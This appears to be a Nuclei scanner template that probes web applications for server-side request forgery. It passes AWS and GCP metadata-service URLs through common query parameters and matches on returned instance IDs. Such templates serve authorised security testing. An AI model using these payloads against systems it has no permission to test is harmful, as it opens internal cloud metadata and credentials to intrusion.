id: THENAWABX_MULTI_CLOUD_SSRF
info:
  name: 🛰️ Nawab-Multi-Cloud-SSRF 🛰️
  author: thenawabx
  severity: critical

http:
  - method: GET
    path:
      - "{{BaseURL}}?url=http://169.254.169.254/computeMetadata/v1/instance/id"
      - "{{BaseURL}}?dest=http://169.254.169.254/latest/meta-data/instance-id"
      - "{{BaseURL}}?uri=http://169.254.169.254/latest/meta-data/instance-id"
      - "{{BaseURL}}?path=http://169.254.169.254/computeMetadata/v1/instance/id"

    headers:
      Metadata-Flavor: "Google"

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: regex
        part: body
        regex:
          - "i-[a-f0-9]{17}" # AWS
          - "^[0-9]{15,25}$" # GCP
        condition: or

      - type: word
        part: body
        negative: true
        words:
          - "Forbidden"
          - "Access Denied"
          - "Cloudflare"

    extractors:
      - type: regex
        part: body
        regex:
          - "i-[a-f0-9]{17}"
          - "[0-9]{15,}"
